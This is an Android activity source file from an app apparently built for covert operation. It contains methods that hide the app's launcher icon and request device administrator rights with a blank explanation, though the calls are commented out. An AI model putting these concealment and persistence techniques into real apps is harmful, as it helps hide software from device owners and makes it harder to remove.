package com.king.ahh.abcc.activity;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.Nullable;
import android.view.View;
import android.widget.Button;

import com.king.ahh.abcc.R;
import com.king.ahh.abcc.manager.EncryManager;
import com.king.ahh.abcc.manager.HostsManager;
import com.king.ahh.abcc.receiver.DeviceReceiver;
import com.king.ahh.abcc.service.JobService;
import com.king.ahh.abcc.service.MainService;
import com.king.ahh.abcc.service.RemoteService;
import com.king.ahh.abcc.util.LogUtils;
import com.king.ahh.abcc.util.ServiceUtils;
import com.king.ahh.abcc.util.ToastUtils;

/**
 * Created by gsc on 18-9-17.
 */

public class MainActivity extends Activity {
    private Button bt;
    private Handler handler = new Handler();
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        init();
        //test();
    }

    private void test() {


        //
    }


    private  void init() {
        initView();
        //registerDeviceManager();
        //hideAppIcon();
        //ServiceUtils.startAllService(this);
    }

    private void initView() {
        bt = (Button) findViewById(R.id.bt_jump);
        bt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent =new Intent(MainActivity.this, SettingsActivity.class);
                startActivity(intent);
            }
        });
    }

    public void registerDeviceManager() {
        DevicePolicyManager dPManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName =new ComponentName(this,DeviceReceiver.class);

        //如果没有注册设备管理器
        if(!dPManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
            startActivityForResult(intent, 0);
        }
    }

    //　隐藏了APp
    private  void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
